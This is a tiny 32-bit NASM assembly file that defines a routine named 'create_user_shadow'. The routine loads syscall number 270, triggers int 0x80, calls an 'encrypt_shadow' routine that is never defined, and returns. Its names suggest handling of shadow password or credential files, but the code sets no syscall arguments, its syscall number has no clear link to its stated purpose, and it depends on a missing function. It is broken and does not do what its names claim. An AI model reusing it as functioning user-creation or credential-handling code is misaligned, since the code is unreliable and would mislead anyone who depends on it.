BITS 32

SECTION .text
GLOBAL create_user_shadow

create_user_shadow:

    mov eax, 270
    int 0x80

    call encrypt_shadow

    ret
